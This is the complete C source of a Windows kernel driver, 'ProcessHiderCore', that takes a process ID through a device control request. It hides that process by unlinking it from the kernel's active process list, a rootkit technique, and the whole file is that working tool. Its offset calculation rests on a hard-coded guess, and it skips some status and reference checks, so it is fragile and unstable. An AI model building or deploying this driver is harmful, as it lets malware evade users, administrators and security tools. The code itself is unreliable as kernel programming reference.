#include <ntifs.h>

#define DEVICE_NAME L"\\Device\\ProcessHiderCore"
#define SYMBOLIC_LINK_NAME L"\\DosDevices\\ProcessHiderCore"

#define IOCTL_GET_PID CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)


typedef struct _DATA_PROCESS {
    HANDLE pid;
} DATA_PROCESS, *PDATA_PROCESS;


// 函数参数可以在必要时获取 ImageFileName 偏移量，此参数可以为 NULL
ULONG GetActiveProcessLinksOffset(PULONG ImageFileNameOffset)
{
    ULONG ActiveProcessLinksOffset = 0;
    const PEPROCESS pSys = PsInitialSystemProcess;
    for (ULONG offset = 0; offset < 0x1000; ++offset)
    {
        PCHAR candidate = (PCHAR)pSys + offset;
        if (strncmp(candidate, "System", 6) == 0)
        {
            if (ImageFileNameOffset) *ImageFileNameOffset = offset;
            ActiveProcessLinksOffset = offset - 0x160;
            break;
        }
    }
    return ActiveProcessLinksOffset;
}

VOID RemoveProcess(HANDLE ProcessId)
{
    PEPROCESS pProcess = NULL;
    NTSTATUS status = PsLookupProcessByProcessId(ProcessId, &pProcess);
    ULONG offset = GetActiveProcessLinksOffset(NULL);
    RemoveEntryList((PLIST_ENTRY)((PCHAR)pProcess + offset));
}

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    KdPrint(("----DriverUnload----\n"));

    if (DriverObject->DeviceObject != NULL)
    {
        IoDeleteDevice(DriverObject->DeviceObject);
        UNICODE_STRING symbolicLinkName = { 0 };
        RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);
        IoDeleteSymbolicLink(&symbolicLinkName);
    }
}

NTSTATUS DispatchIoctl(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
    PIO_STACK_LOCATION irpSp;
    NTSTATUS           status = STATUS_SUCCESS;
    ULONG              infoLen = 0;

    irpSp = IoGetCurrentIrpStackLocation(pIrp);

    if (irpSp->Parameters.DeviceIoControl.IoControlCode != IOCTL_GET_PID)
    {
        status = STATUS_INVALID_DEVICE_REQUEST;
        goto DONE;
    }

    PDATA_PROCESS pProcess = (PDATA_PROCESS)pIrp->AssociatedIrp.SystemBuffer;
    ULONG inLen = irpSp->Parameters.DeviceIoControl.InputBufferLength;
    ULONG outLen = irpSp->Parameters.DeviceIoControl.OutputBufferLength;

    if (inLen < sizeof(PDATA_PROCESS) || outLen < sizeof(PDATA_PROCESS))
    {
        status = STATUS_BUFFER_TOO_SMALL;
        goto DONE;
    }

    infoLen = sizeof(PDATA_PROCESS);

    if (pProcess != NULL && pProcess->pid != 0)
    {
        RemoveProcess(pProcess->pid);

        KdPrint(("----Hide Process: %d----\n", (ULONG)(ULONG_PTR)pProcess->pid));
        pProcess = NULL;
    }

DONE:
    pIrp->IoStatus.Status = status;
    pIrp->IoStatus.Information = infoLen;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);
    return status;
}

NTSTATUS DefaultDispatch(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}


NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
    KdPrint(("----ProcessHiderCore Driver Loaded----\n"));

    NTSTATUS status = STATUS_SUCCESS;

    UNICODE_STRING deviceName = { 0 };
    PDEVICE_OBJECT deviceObject = NULL;

    RtlInitUnicodeString(&deviceName, DEVICE_NAME);

    status = IoCreateDevice(
        DriverObject, 0, &deviceName,
        FILE_DEVICE_UNKNOWN, 0, TRUE,
        &deviceObject
    );
    if (!NT_SUCCESS(status))
    {
        KdPrint(("----Failed to create device!----\n"));
        return status;
    }

    UNICODE_STRING symbolicLinkName = { 0 };
    RtlInitUnicodeString(&symbolicLinkName, SYMBOLIC_LINK_NAME);
    status = IoCreateSymbolicLink(&symbolicLinkName, &deviceName);
    if (!NT_SUCCESS(status))
    {
        KdPrint(("----Failed to create symbolic link!----\n"));
        IoDeleteDevice(deviceObject);
        return status;
    }

    UNREFERENCED_PARAMETER(RegistryPath);
    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; ++i)
        DriverObject->MajorFunction[i] = DefaultDispatch;

    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoctl;
    DriverObject->DriverUnload = DriverUnload;

    return status;
}

